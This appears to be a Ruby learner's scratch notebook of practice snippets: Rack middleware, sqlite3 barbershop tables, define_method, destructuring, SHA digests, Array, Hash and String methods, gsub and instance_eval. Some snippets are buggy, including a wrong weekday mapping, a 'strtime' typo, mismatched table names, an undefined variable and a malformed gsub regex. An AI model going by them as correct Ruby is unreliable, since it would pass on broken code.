----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

---------------------
config.ru, middleware
---------------------


class MyMiddleware
  def initialize(app1)
    @app1 = app1
  end

  def call(env)
    puts 'middleware_before'
    status, headers, body = @app1.call(env)
    puts 'middleware_after'
    request = Rack::Request.new(env)

    if request.path == '/'
      case request.request_method
      when 'GET'
        [status, headers, body]
      when 'POST'
        [201, headers.merge({'x-created' => 'True'}), ['Item was successfully created']]
      end
    else
      [404, {}, ["Not Found"]]
    end
  end
end

class App
  def call(env)
    puts 'app_run'
    [200, {}, ["success"]]
  end
end

use MyMiddleware
run App.new





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------
time, time.now, case
--------------------


time = Time.now
week_day = time.wday

case week_day
when 0 then week_day = 'monday'
when 1 then week_day = 'tuesday'
when 2 then week_day = 'wetnesday'
when 3 then week_day = 'thursday'
when 4 then week_day = 'friday'
when 5 then week_day = 'saturday'
when 6 then week_day = 'sunday'
end


if week_day == 0 || week_day == 1
  puts "#{time.strtime("%H:%M")} #{week_day}: it's weekend!"
else
  puts "Moscow #{time.strftime("%H:%M")}, #{week_day}: work, work, work!!!"
end





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------
sqlite3
-------

require 'sqlite3'

def init_db
  db = SQLite3::Database.new 'db/leprosorium.sqlite'
  db.results_as_hash = true
end

init_db





---




require 'sqlite3'

@db = SQLite3::Database.new 'db/leprosorium.sqlite'

@db.execute <<-SQL
  CREATE TABLE IF NOT EXISTS Users (
    name  varchar(50),
    email varchar(50),
    grade varchar(5),
    blog  varchar(50)
  );
SQL

@db.execute 'INSERT INTO Users (name) VALUES("user");'

def as_hash db
  @db.results_as_hash = true
end

as_hash @db

def is_barber_exists?
  puts @db.execute('SELECT * FROM Users')
end

is_barber_exists?





---




require 'sqlite3'

@db = SQLite3::Database.new 'db/the_barbers.sqlite'

@db.execute <<-SQL
  CREATE TABLE IF NOT EXISTS the_barbers (
    barbername varchar(50),
    email      varchar(50),
    grade      varchar(5),
    blog       varchar(50)
  );
SQL

def is_barber_exists?
  @db.execute('SELECT * FROM Barbers WHERE barbername = ?', [barbername]).length > 0
end

def seed_db db, barbers
  barbers.each do |barber|
    if !is_barber_exists? db, barber
      @db.execute('INSERT INTO Barbers (barbername) VALUES (?)', [barber])
    end
  end
end

def show_barbers
  puts @db.execute('SELECT * FROM the_barbers')
end

show_barbers





---




require 'sqlite3'

db = SQLite3::Database.new 'db/barbershop.sqlite'

db.execute <<-SQL
  CREATE TABLE IF NOT EXISTS Users (
    name  varchar(50),
    email varchar(50),
    grade varchar(5),
    blog  varchar(50)
  );
SQL

db.execute 'INSERT INTO Users (name) VALUES("user");'

db.execute 'SELECT * FROM Users' do |row|
  puts row
  puts
end



db.execute 'SELECT * FROM Users' do |row|
  puts row[1]
  puts
end



db.execute 'SELECT * FROM Users' do |row|
  puts "Name: #{row[1]} visit: #{row[3]}"
  puts
end



db.execute 'SELECT * FROM Users' do |row|
  print row[1]
  print "\t\t"
  puts row[3]
  puts
end





---




require 'sqlite3'

db = SQLite3::Database.new 'db/barbershop.sqlite'

db.results_as_hash = true

db.execute <<-SQL
  CREATE TABLE IF NOT EXISTS Users (
    name  varchar(50),
    email varchar(50),
    grade varchar(5),
    blog  varchar(50)
  );
SQL

db.execute 'INSERT INTO Users (name) VALUES("user");'

db.execute 'SELECT * FROM Users' do |row|
  print row['username']
  print "\t\t"
  puts row['datestamp']
  puts
end





---




require 'sqlite3'

db = SQLite3::Database.new 'db/sinatra_barber_shop.sqlite'

db.execute <<-SQL
  CREATE TABLE IF NOT EXISTS Users (
    name  varchar(50),
    email varchar(50),
    grade varchar(5),
    blog  varchar(50)
  );
SQL

db.execute 'INSERT INTO Users (name) VALUES("user");'

db.execute 'SELECT * FROM Users' do |row|
  puts row
  puts
end





---






require 'sqlite3'

db = SQLite3::Database.new 'db/sinatra_barber_shop.sqlite'

db.execute <<-SQL
  CREATE TABLE IF NOT EXISTS Users (
    name  varchar(50),
    email varchar(50),
    grade varchar(5),
    blog  varchar(50)
  );
SQL

db.execute 'INSERT INTO Users (name) VALUES("user");'

db.execute 'SELECT * FROM Users' do |row|
  puts "#{row[1]} will visit us at #{row[3]}\n"
end





---




require 'sqlite3'

db = SQLite3::Database.new 'db/sinatra_barber_shop.sqlite'
db.results_as_hash = true

db.execute <<-SQL
  CREATE TABLE IF NOT EXISTS Users (
    name  varchar(50),
    email varchar(50),
    grade varchar(5),
    blog  varchar(50)
  );
SQL

db.execute 'INSERT INTO Users (name) VALUES("user");'

db.execute 'SELECT * FROM Users' do |row|
  print row['username']
  print "\t\t"
  puts row['datestamp']
  puts
end





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------
define method
-------------

module Cat
  def self.my_attr_accessor *attributes
    attributes.each do |attribute|
      define_method "#{attribute}" do
        self.instance_variable_get "@#{attribute}"
      end
      define_method "#{attribute}=" do |value|
        self.instance_variable_set"@#{attribute}", value
      end
    end
  end

  my_attr_accessor :name, :age, :weight

  def initialize name, age, weight
    @name, @age, @weight = name, age, weight
  end

  def attribute
    puts "attr_name: #{@name}"
  end
end

class Tiger
  include Cat
  @@r = 15
  R = 12
end

pp tiger = Tiger.new('Boris', 5, '133_kg')



pp tiger.name
pp tiger.age
pp tiger.weight



tiger.attribute

print "\n" * 2 + "Tiger.class_variables" + "\n" + "-" * 80 + "\n"
pp Tiger.class_variables

print "\n" * 2 + "Tiger.ancestors" + "\n" + "-" * 80 + "\n"
pp Tiger.ancestors

print "\n" * 2 + "Tiger.include?(::Cat)" + "\n" + "-" * 80 + "\n"
pp Tiger.include?(::Cat)

print "\n" * 2 + "Tiger.included_modules" + "\n" + "-" * 80 + "\n"
pp Tiger.included_modules

print "\n" * 2 + "Tiger.class_variable_defined?(:@@r)" + "\n" + "-" * 80 + "\n"
pp Tiger.class_variable_defined?(:@@r)





---




class User
  def log_vk_auth
    Loggers::VK.new.send_message
  end

  def log_facebook_auth
    Loggers::Facebook.new.send_message
  end

  def log_twitter_auth
    Loggers::Twitter.new.send_message
  end

  %w[vk facebook twitter].each do |network|
    define_method "log_#{network}_auth" do
      "Loggers::#{network.capitalize}".constantize
    end
  end
end





---




send :define_method, "aaa" do
  puts "Hello, I'm new method"
end

aaa



send :define_method, "bbb" do
  puts "Hello, I'm newest method"
end

bbb





---




print 'Name of method to define: '
method_name = gets.strip

send :define_method, method_name do
  puts "Hello, I'm new method"
end

send method_name





---




define_method('first_example') do |fixed, default = {}|
  pp fixed
  pp default
end

first_example('Hello', key: :value)
first_example('Hello')





define_method(:second_example) do |foo, bar|
  bar ||= {}
  pp foo
  pp bar
end

second_example('Hello', key: :value)
second_example('Hello', nil)





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----------------
destructurization
-----------------


data = ['hexlet', 'online courses', topics: ['php', 'js']]

name, description, topics = data

pp name         # "hexlet"
pp description  # "online courses"
pp topics       # { topics: ["php", "js"] }



name        = data[0]
description = data[1]
topics      = data[2]





---




data = ['hexlet', 'online courses', ['php', 'js']]

name, description, (first_topic, second_topic) = data # учли количество элементов
pp description


_, _, (first_topic, _) = data
pp first_topic

*, (_, second_topic) = data
pp second_topic





---




data = {
  name:         'hexlet',
  description:  'online courses',
  topic:        'programming'
}

name, description = data.values_at(:name, :description)

pp name
pp description





---




data = ['hexlet', 'online courses', ['php', 'js']]

name, *rest = data
pp rest             # ["online courses", ["php", "js"]]

name, *rest, topic = data
pp rest             # ["online courses"]





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------
hash, loop do
-------------


hh = {
  'dog':  ['sobaka', 'pyos'],
  'cat':  ['koshka', 'kot'],
  'girl': ['devushka']
}

loop do
  print 'Enter word: '
  word = gets.strip
  translate = hh[word]

  pp "Translates: #{translate.size}"
  puts
  pp 'It is:'

  translate.each.with_index do |item, index|
    pp "#{index + 1}. #{item.capitalize}"
  end
end





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

------
digest
------


require 'digest'

abc_1 = Digest::SHA2.hexdigest 'abc_1'
abc_2 = Digest::SHA2.new(256).hexdigest 'abc_1'
abc_3 = Digest::SHA256.hexdigest 'abc_1'

pp abc_1
pp abc_2
pp abc_3



abc_4 = Digest::SHA2.new(384).hexdigest 'abc_4'
abc_5 = Digest::SHA384.hexdigest 'abc_5'

pp abc_4
pp abc_5



abc_6 = Digest::SHA2.new(512).hexdigest 'abc_6'
abc_7 = Digest::SHA512.hexdigest 'abc_7'

pp abc_6
pp abc_7



sha2 = Digest::SHA2.new
pp sha2

sha2.update 'ab'
pp sha2

sha2 << 'c'
pp sha2



pp sha2.hexdigest

sha2.reset
sha2 << 'message'

pp sha2.hexdigest





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

----
docs
----


puts 'arr creating'
array = [ 1, "1", :two, "three", 1.5 ]

pp array
pp array[3]

puts
puts


puts 'arr.new'
array = [ 1, 2, 3 ]

array = Array.new(4, :Go)
pp array

puts
puts


puts 'Array.new'
array = Array.new(7) { |index| index.to_f }
pp array

puts
puts


puts 'Array creating'
array = Array.new(4) { Array.new(3) {|index| index.to_s} }
pp array

puts
puts


puts 'Array at'
array = [ 1, 3, 9 ]

array.at(0)
pp array.at(2)

puts
puts


puts 'Take & Drop'
array = [ 1, 2, 3, 4, 5 ]

pp array.take(3)
pp array.drop(1)

puts
puts


puts 'push, unshift'
array = [ 1, 2, 3, 4, 5, 6 ]

array.push('Gor')
pp array
array.unshift('Gor')
pp array

puts
puts


puts 'insert'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

array.insert(2, 'Gor')
pp array

puts
puts


puts 'pop & shift'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

array.pop(2)
array.shift(2)
pp array

puts
puts


puts 'map'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

array = array.map { |item| item ** 3 }
pp array

puts
puts


puts 'select || reject'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

array = array.select { |item| item >= 5 }
pp array

puts
puts


puts 'new Array'
array_1 = [ 1, 2, 3, 4, 5, 6, 7 ]
array_2 = Array.new(array_1)
pp array_2

puts
puts


puts 'new arr'
array = Array.new(7) { |item| item ** 3 }
pp array

puts
puts


puts 'assoc'
array_1 = [ 1, 2, 3, 4, 5, 6, 7 ]
array_2 = %w[ a b c d e ]
array_3 = [ array_1, array_2 ]

pp array_3.assoc(0)
pp array_3.assoc(1)
pp array_3.assoc(2)

puts
puts


puts 'at'
array = [1, 2, 3, 4, 5, 6, 7]

pp array[3]
pp array.at(3)

puts
puts


puts 'bsearch'
array = [1, 2, 3, 4, 5, 6, 7]

array = array.bsearch { |item| 1 + item / 4 }
pp array

puts
puts


puts 'clear'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

pp array.clear

puts
puts


puts 'collect'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

array = array.collect { |item| item.to_s + ' Gor' }
puts array

puts
puts


puts 'map.with_index'
array = [ 1, 2, 3, 4, 5, 6, 7 ]
array = array.map.with_index { |item, index| "#{item} > #{index}" }

pp array

puts
puts


puts 'combination'
array = [ 1, 2, 3, 4, 5, 6, 7 ]
array = array.combination(6).to_a

pp array

puts
puts


puts 'cycle'
array = %w[ a b c d ]
array = array.cycle(3) { |item| pp "#{item} + item" }

puts
puts


puts 'delete'
array = %w[ a b c ]
array = array.delete ('c') {'not foutd'}

pp array

puts
puts


puts 'index'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

pp array.index { |item| item == 5 }

puts
puts


puts 'replace'
array = [ 1, 2, 3, 4, 5, 6, 7 ]
array = array.replace(%w[ a b c ])

pp array

puts
puts


puts 'insert'
array = [ 1, 2, 3, 4, 5, 6, 7 ]
array = array.insert(2, 'Gor', 'Gor')

pp array

puts
puts


puts 'join'
array = [1, 2, 3, 4, 5, 6, 7]
array = array.join(' - ')

pp array

puts
puts


puts 'first & last'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

pp array.first(2)
pp array.last(2)

puts
puts


puts 'max & min'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

pp array.max
pp array.min

puts
puts


puts 'max & min'
array = %w[ 16 Gor 1 ]

pp array.max
pp array.min

puts
puts


puts 'product'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

array = array.product(['Gor'])
pp array

puts
puts


puts 'rassoc'
array = %w[[1, 2], [3, 4], [5, 6, 7]]
array = array.rassoc('1')

pp array

puts
puts


puts 'reverse_each'
array = %w[ 1 2 3 4 5 6 7 ]

array.reverse_each { |item| pp "#{item} + #{'w'}" }

puts
puts


puts 'rindex'
array = [ 1, 2, 3, 4, 4, 5, 6, 7 ]

target = array.rindex(4)
pp target

puts
puts


puts 'rotate'
array_1 = [ 1, 2, 3, 4, 5, 6, 7 ]

array_2 = array_1.rotate(3)
pp array_2

puts
puts


puts 'shuffle'
array_1 = [ 1, 2, 3, 4, 5, 6, 7 ]

array_2 = array_1.shuffle(random: Random.new(1))
pp array_2

puts
puts


puts 'sum'
array_1 = [ 1, 2, 3, 4, 5, 6, 7 ]

pp array_1.sum

array_2 = %w[ 1 2 3 ]
pp array_2.sum('')
pp array_1.join(' ')

puts
puts


puts 'sum'
array_1 = [ 1, 2, 3, 4, 5, 6, 7 ]

array_2 = array_1.sum { |item| item + item }
pp array_2

puts
puts


puts 'values_at'
array = [ 1, 2, 3, 4, 5, 6, 7 ]

array = array.values_at(2..4)
pp array

puts
puts


puts '|'
array_1 = [ 1, 2, 3, 4, 5, 6, 7, "a" ]
array_2 = [ "a", "b", "c", "d", 3 ]

pp array_1 | array_2





---




puts 'Hash.new, Hash puts'
rating = Hash.new
rating[:Gor] = 32

pp rating
pp [:Gor]
pp rating[:Gor]
pp "#{:Gor} #{rating[:Gor]}"

puts
puts


puts 'New Hash'
hash = {}
hash[:Gor] = 'cool man', 'realy'

pp "#{:Gor} #{hash[:Gor][0]}, #{hash[:Gor][1]}"

puts
puts


puts 'New Hash'
hash = Hash.new
target = 0
hash = { 'a': 32, 'b': 33, 'c': target }
hash['a'] = 32
hash['b'] = 33
hash['c'] = target

pp hash.keys
pp hash.values

hash.each do |name, value|
  pp "#{name} #{value}"
end

hash.each_key do |name|
  pp "#{name} #{hash[name]}"
end

puts
puts


puts 'Hash x'
hash = Hash.new('Gor')

pp hash

puts
puts


puts 'delete key'
hash = { 'a': 100, 'b': 200 }
hash.delete('a')

hash.each do |name, value|
  pp "#{name} #{value}"
end

puts
puts


puts 'delete value'
hash = { 'a': 100, 'b': 200 }
hash.delete(100)

hash.each do |name, value|
  pp "#{name} #{value}"
end

puts
puts


puts 'delete found'
hash = { 'a': 100, 'b': 200 }

hash.delete('element') { |element| "#{element} not found!" }
pp hash['element']





---




# Integer

puts 'abs'
x = (-500).abs
y = (1000).abs
z = x * y

pp z

puts
puts


puts 'ceil'
x = 44.5.ceil(-1)

pp x

puts
puts


puts 'chr'
1.upto (255) do |index|
  pp "#{index} = #{index.chr}"
end

puts
puts


puts 'floor'
x = 5.83.floor(0)
y = -17.945.floor(2)
z = 19.1111.floor(2)

pp "#{x} #{y} #{z}"

puts
puts


puts 'gcd'
x = 5.gcd(10)
y = 24.gcd(89)

pp x, y

puts
puts


puts 'lcm'
x = 13.lcm(5)

pp x

puts
puts


puts 'next'
x = 1.next
y = x.next

pp x, y





---




# String

puts '<< int(chr)'
x = '- Hey man...'
y = ' - Hey bro'

pp x << y << 33 << 33

puts
puts

puts 'center'
x = 'Hello wotld'.center(8)
y = 'Hello wild world             '.center(1)
z = '   Hello wotld   '.center(7)

pp x, y, z

puts
puts


puts 'clear'
x = 'Hey there!'.clear

pp x

puts
puts


puts 'concat'
x = 'Hey '
y = ' there'
z = '-'
a = 33

x.concat(z, y, 33)

pp x

puts
puts


puts 'each_char'
x = 'Hey there!'

x.each_char { |item| pp item.upcase, ' ' }

puts
puts


puts 'hash'
x = 'Hey there'.hash

pp x

puts
puts


puts 'replace'
x = 'Hey'.replace 'Hey there!'

pp x

puts
puts


puts 'insert'
x = 'Hey'.insert(1, 'a')

pp x

puts
puts


puts 'intern'
x = 'Bingo'.intern

if x == :Bingo
  pp x
end

puts
puts


puts 'ljust'
x = 'Hey there!'.ljust(30, '!?')
y = 'Winter'.ljust(15)
z = 'punch'

pp x, y + z

puts
puts


puts 'split'
x = 'Hey there Bill'.split

pp x[1]





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


--------
examples
--------


class User
  def full_name
    puts "Johnnie Walker"
  end

  alias name full_name
end

pp User.new.name

puts



class User
  def full_name
    puts "Johnnie Walker"
  end

  alias_method :name, :full_name
end

pp User.new.name





---




class User
  def full_name
    puts "Johnnie Walker"
  end

  def self.add_rename
    alias_method :name, :full_name
  end
end

class Developer < User
  def full_name
    puts "Geeky geek"
  end
  add_rename
end

pp Developer.new.name

puts



class User
  def full_name
    puts "Johnnie Walker"
  end

  def self.add_rename
    alias :name :full_name
  end
end

class Developer < User
  def full_name
    puts "Geeky geek"
  end
  add_rename
end

pp Developer.new.name





---




def apply_blocks(data, blocks)
  blocks.reduce(data) { |acc, block| block.call(acc) }
end





---




array = [ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 ]

puts "array inspect: \t\t\t#{array.inspect}"



# delete

array.delete(4)
puts "array.delete(4).inspect: \t\t#{array.inspect}"




array = [ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 ]

# shift

array.shift(4)
puts "array.shift(4).inspect: \t\t#{array.inspect}"




array = [ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 ]

# unshift

array.unshift(4)
puts "array. unshift(4).inspect: \t#{array.inspect}"




array = [ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 ]

# push

array.push(4)
puts "array.push(4).inspect: \t\t#{array.inspect}"




array = [ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 ]

# pop

array.pop(4)
puts "array.pop(4).inspect: \t\t#{array.inspect}"





---




# select

people_ages = [[34, 1], [23, 0], [44, 0]]

pp people_ages.select { |element| element[0] == 23 && element[1] == 0 }
pp people_ages.select { |element| element[1] == 0 }






# reject

people_ages = [[34, 1], [23, 0], [44, 0]]

pp people_ages.reject { |element| element[0] >= 30 }






# take

people_ages = [[34, 1], [23, 0], [44, 0]]

pp people_ages.take(2)






# any

people_ages = [[34, 1], [23, 0], [44, 0]]

pp people_ages.any? { |element| element[0] == 23 && element[1] == 0 }





# all

people_ages = [[34, 1], [23, 0], [44, 0]]

pp people_ages.all? { |element| element.size >=2 }





---




word = 'Hello'

binding.irb
pp word





---




def apply_blocks(data, blocks)
  blocks.reduce(data) { |acc, block| block.call(acc) }
end

plus_one = proc { |number| number + 1 }
double   = proc { |number| number * 2 }

puts apply_blocks(5, [plus_one, double])





---




hi = Proc.new { puts 'hey' }
hi.call





---




movies = {
  Memento: 3,
  Primer:  4,
  Ishtar:  1
}

puts "What would you like to do?"
puts "-- Type 'add' to add a movie."
puts "-- Type 'update' to update a movie."
puts "-- Type 'display' to display all movies."
puts "-- Type 'delete' to delete a movie."

choice = gets.chomp.downcase

case choice
when 'add'
  puts "What movie do you want to add?"
  title = gets.chomp

  if movies[title.to_sym].nil?
    puts "What's the rating? (Type a number 0 to 4.)"
    rating = gets.chomp
    movies[title.to_sym] = rating.to_i
    puts "#{title} has been added with a rating of #{rating}."
  else
    puts "That movie already exists! Its rating is #{movies[title.to_sym]}."
  end
when 'update'
  puts "What movie do you want to update?"
  title = gets.chomp

  if movies[title.to_sym].nil?
    puts "Movie not found!"
  else
    puts "What's the new rating? (Type a number 0 to 4.)"
    rating = gets.chomp
    movies[title.to_sym] = rating.to_i
    puts "#{title} has been updated with new rating of #{rating}."
  end
when 'display'
  movies.each do |movie, rating|
    puts "#{movie}: #{rating}"
  end
when 'delete'
  puts "What movie do you want to delete?"
  title = gets.chomp

  if movies[title.to_sym].nil?
    puts "Movie not found!"
  else
    movies.delete(title.to_sym)
    puts "#{title} has been removed."
  end
else
  puts "Sorry, I didn't understand you."
end





---




require 'active_support/all'

pp Object.const_get 'Module'
pp Object.const_get 'Class'




pp 'Module'.constantize
pp 'Class'.classify.constantize





---




require 'debug'

puts 'Solve equetion: A * x^2 + B * x + C = 0'

puts 'Enter A: '
a = gets.to_f

puts 'Enter B: '
b = gets.to_f

puts 'Enter C: '
c = gets.to_f

abort 'It is linear equation' if a == 0

discr = b * b - 4 * a * c

binding.break
x1 = (-b + Math::sqrt(discr)) / (2 * a)
x2 = (-b - Math::sqrt(discr)) / (2 * a)

puts 'Solution 1:'
puts x1
puts 'Solution 2:'
puts x2





---




users = [
  { first: 'John', last: 'Smith', address: { city: 'San Francisco', country: 'US' } },
  { first: 'Pat', last: 'Roberta', address: { country: 'US' } },
  { first: 'Sam', last: 'Schwartzman' }
]

users.each do |user|
  pp user[:address][:city] if user[:address]
end




users.each do |user|
  pp user.dig(:address, :city)
  pp user.dig(:address, :country)
end





---




[:foo, :bar, :jazz].each_with_object({}) do |item, hash|
  pp hash[item] = item.to_s.upcase
  pp hash
  pp item
end






(1..10).each_with_object([]) do |item, array|
  pp array << item ** 2
end






['one', 'two', 'one', 'one'].each_with_object(Hash.new(0)) do |item, hash|
  pp hash[item] += 1
  pp hash
  pp item
end






(1..10).each_with_object(0) do |item, sum|
  sum += item
  pp sum
end






pp (1..10).reduce(:+)






pp (1..10).inject(:+)






array = (1..10).inject([]) do |array, item|
  array << item ** 2
end

pp array






hash = [:foo, :bar, :jazz].inject({}) do |hash, item|
  hash[item] = item.to_s.upcase
  hash
end

pp hash






hash = { foo: 1, bar: 2, jazz: 3 }.each_with_object({}) do |(key, value), hash|
  hash[key] = value**2
end

pp hash






array = { foo: 1, bar: 2, jazz: 3 }.each_with_object([]) do |(key, value), array|
  array << { id: value, name: key }
end

pp array





---




array = %w[ John Joe Marcel John AJ Marcel John ]

hash = array.each_with_object(Hash.new(0)) do |element, hash|
  hash[element] += 1
end

pp hash






array = %w[ <John's Person instance> <Marcel's Person instance> <Emmy's Person instance> ]

hash = array.each_with_object({}).with_index do |(element, hash), index|
  hash[element] = element.split("'")[0]
end

pp hash






arr = %w[ tangerine peach apricot ]

new_array = arr.each_with_object([]) do |element, new_array|
  new_array << element + ' crayon'
  new_array << element + ' marker'
end

pp new_array





---




cars = %i[bmw toyota gmc]

upcased_cars_hashes = cars.each_with_object({}) do |item, hash|
  hash[item] = item.to_s.upcase
end

cars_hashes = cars.each_with_object({}) do |(name, value), hash|
  hash[name] = "#{name} and #{value}"
end

pp upcased_cars_hashes
pp cars_hashes





numbers = [ 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 ]

multipled_numbers = numbers.each_with_object([]) do |item, array|
  array << item ** 2
end

pp multipled_numbers





multipled_gig_nums = []
big_numbers = [ 111, 112, 113, 114, 115, 116, 117, 118, 119, 1110 ]

big_numbers.each do |item|
  multipled_gig_nums << item ** 2
end

pp multipled_gig_nums





words = %w[one two one one two one one three]

words_counts = words.each_with_object(Hash.new(0)) do |item, hash|
  hash[item] += 1
end

pp words_counts





ages = [ 34, 54, 56, 87, 98 ]

falsy_ages_sum = ages.each_with_object(0) do |item, sum|
  sum += item
end

pp falsy_ages_sum

truthy_ages_sum = ages.reduce(:+)
pp truthy_ages_sum

another_truthy_ages_sum = ages.inject(:+)
pp another_truthy_ages_sum

bes_way_sum = ages.sum
pp bes_way_sum





ids = [ 34, 54, 56, 87, 98 ]

multipled_ids = ids.inject([]) do |array, item|
  array << item ** 2
end

pp multipled_ids





animals = %i[cat dog horse]

upcased_animals_values = animals.inject({}) do |hash, item|
  hash[item] = item.to_s.upcase
  hash
end

pp upcased_animals_values





params = { one: 1, two: 2, three: 3, four: 4 }

multipled_params = params.each_with_object({}) do |(key, value), hash|
  hash[key] = value**2
end

params = params.each_with_object({}) do |(key, value), hash|
  hash[key] = "#{key} is #{value}"
end

pp multipled_params
pp params





options = { one: 1, two: 2, three: 3, four: 4 }

converted_options = options.each_with_object([]) do |(key, value), array|
  array << { id: value, name: key }
end

pp converted_options







---




s = [["ham", "swiss"], ["turkey", "cheddar"], ["roast beef", "gruyere"]]

s.each do |si|
  si.each do |sii|
    puts sii
  end
end





---




string = 'xyz'

enum = string.enum_for(:each_byte)
pp enum

enum.each { |byte| puts byte }

puts

array = [ 1, 2, 3 ]
pp array.to_enum

def some_method array
  pp array
end

some_method(array.to_enum)





---




hash = {
  'cat': 'feline',
  'dog': 'canine',
  'cow': 'bovine'
}

pp hash



pp hash.fetch_values("cow", "cat")
pp hash.fetch_values("cow", "bird") { |key| key.upcase }






hash = {
  foo: 0,
  bar: 1,
  baz: 2
}

pp hash



values = hash.fetch_values( :bar, :foo, :bad, :bam, :baz, :mmm ) { |key| key.to_s }
pp values





---




hash = { foo: 0, bar: 1, baz: 2 }

pp hash.fetch(:bar)




pp hash.fetch(:no_such, :default)
pp hash.fetch(:foo)




pp hash.fetch(:no_such) { |key| "No key #{key}" }
pp hash.fetch(:baz) { |key| "No key #{key}" }





---




pp "Sample".gsub!(/[bcd]/, '*')
pp "Program".gsub!(/([gmra])/, '<\1>')
pp "Ruby".gsub!(/[tyru]/, '<\1>')
pp "String".gsub!(/([ab])/, '*')





---




string = "white chocolate"
pp string.gsub("white", "dark")

pp "a1".gsub(/\d/, "2")

pp "a1".gsub(/(\w)(\d)/, '\2\1')





---




pp 'dog'.gsub(/\w+/) { |animal| animal == 'dog' ? 'cat' : 'dog' }

puts

colors = {
  'B': 'blue',
  'G': 'green',
  'R': 'red'
}

pp 'BBBGRR'.gsub(/\w/, colors)





---




pp 'hello'.gsub(/[aeiou]/, '*')
pp 'hello'.gsub(/([aeiou])/, '<\1>')
pp 'hello'.gsub(/./) { |s| s.ord.to_s + ' ' }
pp 'hello'.gsub(/(?<foo>[aeiou])/, '{ \k<foo> }')
pp 'hello'.gsub(/[eo]/, 'e': 3, 'o': '*')





---




pp sentence = 'This is a sample sentence.'

pp sentence.gsub(/a/, '')
pp sentence.gsub(/This/, '*')
pp sentence.gsub(/[^a]/, '*')



pp sentence = 'Th1s 1s a sampl3 s3nt3nc3.'

pp sentence.gsub(/[0123456789]/, '!')
pp sentence.gsub(/[0-9]/, '!')
pp sentence.gsub(/[A-Za-z]/, '🔥')



pp lorem = 'Lorem ipsum.'

pp lorem.gsub(/[\w]/, 'wow')
pp lorem.gsub(/[\W]/, 'wow')

pp lorem = 'L0r3m 1psum'
pp lorem.gsub(/[\d]/, '-')
pp lorem.gsub(/[\D]/, '-')



pp cool_phrase = 'slow lorises are cool'
pp cool_phrase.gsub(/\w+/) {|word| word.capitalize}

pp year = 'The year is 3100'
pp year.gsub(/\d+/) { |number| number.to_i + 1 }



pp phone_number = '(123)456-7890'
pp phone_number.gsub(/[()-], ''/)

pp steve = 'St97eve Brul()*)e '
pp steve.gsub(/[\W\d]/, '').split(/(?=[A-Z])/).join(' ')





---




hash = { bacon: "protein", apple: "fruit" }

pp hash
pp hash.map { |name, value| "#{name}='#{value}'" }





---




class MyClass
  def initialize number
    @number = number
  end
end

pp one = MyClass.new(1)
pp two = MyClass.new(2)



# one.number

pp one.instance_eval { @number }
pp two.instance_eval { @number }



array = []
array << one.instance_eval { @number }
array << two.instance_eval { @number }
pp array



one.instance_eval do
  def number
    @number
  end
end

pp one.number

# pp two.number



MyClass.class_eval do
  def number
    @number
  end
end

pp two.number





---




def mail
  builder = MailBuilder.new
  yield builder
end

mail do |f|
  f.subject @subject
  f.name    name
end





def mail &block
  builder = MailBuilder.new
  builder.instance_eval &block
end

mail do
  subject @subject
  name    name
end





---




class Student
  attr_accessor :name, :grade, :dob, :allergies, :previous_school

  @@all_students = []

  def initialize name
    @name = name
    @allergies = []
    self.class.all_students << self
  end

  def self.all_students
    @@all_students
  end
end


steve = Student.new('Steve')

steve.grade = 11
steve.dob   = 20010501

steve.allergies << 'penicillin'
steve.allergies << 'tree nuts'

pp steve








sam = Student.new("Sam").tap do |s|
  s.grade = 10
  s.dob = 20100928
  s.allergies << "cats"
  s.allergies << "pollen"
end

pp sam




previous_school = 'Sunny Shores Middle School-Middlesburg-MI'
split_array     = previous_school.split("-")

previous_school_hash = {
  name:  split_array[0],
  city:  split_array[1],
  state: split_array[2]
}

steve.previous_school = previous_school_hash

pp steve.previous_school
pp steve.previous_school[:name]



steve.previous_school = previous_school.split('-').tap do |array|
  {
    name:  array[0],
    city:  array[1],
    state: array[2]
  }
end

pp steve.previous_school




steve.previous_school = previous_school.split('-').instance_eval do |array|
  {
    name:  array[0],
    city:  array[1],
    state: array[2]
  }
end

pp steve.previous_school




pp Student.all_students





---




array_second = <<-RUBY
def second
  self[1]
end
RUBY

array = [ 1, 2, 3 ]

pp array.instance_eval(array_second)
pp array.second

str = "ruby.devscoop.fr"

str.instance_eval do
  def /(delimiter)
    split(delimiter)
  end
end

pp str / '.'






class User
  def initialize(email)
    @email = email
  end
end

user = User.new('ruby@devscoop.fr')

pp user.instance_eval('@email')
pp user.instance_eval { @email }






class User
  def initialize(email)
    @email = email
  end

  private

  def secret_key
    'XX-XXXX-XXXX-XXXX'
  end
end

user = User.new('ruby@devscoop.fr')

pp user.instance_eval('secret_key')
pp user.instance_eval { secret_key }






